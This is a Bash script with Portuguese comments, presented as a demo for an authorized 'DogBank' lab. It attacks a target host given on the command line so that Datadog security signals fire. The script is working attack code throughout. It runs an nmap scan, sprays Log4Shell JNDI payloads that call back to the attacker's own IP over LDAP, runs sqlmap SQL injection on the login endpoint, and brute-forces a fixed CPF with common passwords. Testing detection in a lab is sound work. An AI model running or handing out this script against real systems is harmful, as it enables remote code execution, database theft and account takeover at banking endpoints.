#!/bin/bash
# DogBank Security Scanner — Demo Script
# Uso: ./dogbank-pwn.sh [target]
# Exemplo: ./dogbank-pwn.sh lab.dogbank.dog

TARGET="${1:-lab.dogbank.dog}"
MY_IP=$(ip addr show | grep "inet " | grep -v 127 | awk '{print $2}' | cut -d/ -f1 | head -1)
OUT=~/dogbank-pwn-results
mkdir -p $OUT

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

print_banner() {
  echo -e "${RED}"
  echo "  ██████╗  ██╗    ██╗███╗   ██╗"
  echo "  ██╔══██╗ ██║    ██║████╗  ██║"
  echo "  ██████╔╝ ██║ █╗ ██║██╔██╗ ██║"
  echo "  ██╔═══╝  ██║███╗██║██║╚██╗██║"
  echo "  ██║      ╚███╔███╔╝██║ ╚████║"
  echo "  ╚═╝       ╚══╝╚══╝ ╚═╝  ╚═══╝"
  echo -e "${NC}"
  echo -e "${BOLD}  DogBank Script Kiddie Scanner${NC}"
  echo -e "  Target : ${YELLOW}https://$TARGET${NC}"
  echo -e "  My IP  : ${YELLOW}$MY_IP${NC}"
  echo -e "  Output : ${YELLOW}$OUT/${NC}"
  echo ""
  echo -e "  ${RED}⚠️  Ambiente de demo autorizado — DogBank Lab${NC}"
  echo "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

print_section() {
  echo ""
  echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "${CYAN}  $1${NC}"
  echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

found() { echo -e "  ${RED}⚠️  ENCONTRADO: $1${NC}"; }
clean() { echo -e "  ${GREEN}✓ $1${NC}"; }
info()  { echo -e "  ${YELLOW}→ $1${NC}"; }

# ─────────────────────────────────────────────
print_banner
sleep 1

# ─── 1. PORT SCAN ────────────────────────────
print_section "1/5  PORT SCAN (nmap)"
info "Mapeando serviços expostos..."
nmap -sV --open -p 80,443,8080,8088,8089,9090 $TARGET 2>/dev/null \
  | tee $OUT/nmap.txt \
  | grep -E "open|VERSION|rDNS|address"
clean "Salvo em $OUT/nmap.txt"

# ─── 2. SECURITY HEADERS ─────────────────────
print_section "2/5  SECURITY HEADERS"
info "Verificando headers de proteção..."
curl -sk -I https://$TARGET > $OUT/headers.txt 2>&1

MISSING=0
for h in "Strict-Transport-Security" "Content-Security-Policy" "X-Frame-Options" "X-Content-Type-Options" "X-XSS-Protection"; do
  if grep -qi "$h" $OUT/headers.txt; then
    clean "$h presente"
  else
    found "$h AUSENTE"
    MISSING=$((MISSING+1))
  fi
done
[ $MISSING -gt 0 ] && found "$MISSING headers de segurança ausentes" || clean "Todos os headers presentes"

# ─── 3. LOG4SHELL ────────────────────────────
print_section "3/5  LOG4SHELL (CVE-2021-44228)"
info "Enviando payloads JNDI nos headers HTTP..."

PAYLOAD="\${jndi:ldap://$MY_IP:389/dogbank-exploit}"
ENDPOINTS=("/api/auth/login" "/api/pix/transfer" "/api/transactions")
HEADERS_LIST=("User-Agent" "X-Forwarded-For" "X-Api-Version" "X-Real-IP" "Referer" "CF-Connecting-IP")

echo "" > $OUT/log4shell.txt
for endpoint in "${ENDPOINTS[@]}"; do
  for header in "${HEADERS_LIST[@]}"; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
      -H "$header: $PAYLOAD" \
      -H "Content-Type: application/json" \
      -d '{"cpf":"test","senha":"test"}' \
      "https://$TARGET$endpoint" 2>/dev/null)
    echo "[$CODE] $header → $endpoint" | tee -a $OUT/log4shell.txt
  done
done

found "Payloads enviados em ${#HEADERS_LIST[@]} headers × ${#ENDPOINTS[@]} endpoints"
info "Verifique o Datadog ASM → signals de Log4Shell devem aparecer agora"

# ─── 4. SQL INJECTION ────────────────────────
print_section "4/5  SQL INJECTION (sqlmap)"
info "Testando endpoint de login contra SQL Injection..."
info "Aguarde ~2 minutos..."

sqlmap -u "https://$TARGET/api/auth/login" \
  --data='{"cpf":"*","senha":"test"}' \
  --content-type="application/json" \
  --level=2 --risk=1 \
  --batch --silent \
  --output-dir=$OUT/sqlmap \
  2>&1 | tee $OUT/sqli.txt | grep -E "injectable|vulnerable|WARNING|critical|Parameter|Type:" | head -20

if grep -qi "injectable\|is vulnerable" $OUT/sqli.txt 2>/dev/null; then
  found "SQL INJECTION CONFIRMADO!"
else
  info "Resultado completo em $OUT/sqli.txt"
fi

# ─── 5. BRUTE FORCE ──────────────────────────
print_section "5/5  BRUTE FORCE (hydra)"
info "Testando resistência do login a senhas comuns..."

PASSWORDS=("123456" "senha" "password" "dogbank" "12345678" "qwerty" "dog1234" "mudar123")
CPF="12345678915"
FOUND_PASS=""
RATE_LIMITED=false

for pass in "${PASSWORDS[@]}"; do
  RESP=$(curl -sk -w "\n%{http_code}" \
    -H "Content-Type: application/json" \
    -d "{\"cpf\":\"$CPF\",\"senha\":\"$pass\"}" \
    "https://$TARGET/api/auth/login" 2>/dev/null)
  CODE=$(echo "$RESP" | tail -1)
  BODY=$(echo "$RESP" | head -1)

  if echo "$BODY" | grep -qi "bloqueado\|blocked\|rate.limit\|muitas tentativas"; then
    clean "Rate limit ativo — bloqueado após tentativas repetidas"
    RATE_LIMITED=true
    break
  elif [ "$CODE" = "200" ] && echo "$BODY" | grep -qi "token\|success\|jwt"; then
    found "LOGIN BEM-SUCEDIDO com senha: '$pass'"
    FOUND_PASS=$pass
    break
  else
    info "Tentativa '$pass' → HTTP $CODE"
  fi
  sleep 0.3
done

[ -z "$FOUND_PASS" ] && [ "$RATE_LIMITED" = false ] && \
  info "Sem rate limit detectado — vulnerável a ataque com rockyou.txt"

# ─── RELATÓRIO FINAL ─────────────────────────
print_section "RELATÓRIO FINAL"
echo ""
echo -e "  ${BOLD}Verifique o Datadog ASM agora:${NC}"
echo -e "  ${YELLOW}Security → Application Security → Signals${NC}"
echo ""
echo -e "  Signals esperados:"
echo -e "  ${RED}  • Log4Shell Exploit Attempt (CVE-2021-44228)${NC}"
echo -e "  ${RED}  • SQL Injection Attack${NC}"
echo -e "  ${RED}  • Credential Stuffing / Brute Force${NC}"
echo -e "  ${RED}  • Security Scanner Detected${NC}"
echo ""
echo -e "  ${BOLD}Arquivos gerados:${NC}"
echo -e "  ${YELLOW}  $OUT/nmap.txt${NC}      → serviços expostos"
echo -e "  ${YELLOW}  $OUT/headers.txt${NC}   → headers ausentes"
echo -e "  ${YELLOW}  $OUT/log4shell.txt${NC} → payloads enviados"
echo -e "  ${YELLOW}  $OUT/sqli.txt${NC}      → resultado SQL injection"
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}  Scan completo. Duração total: $SECONDS segundos${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
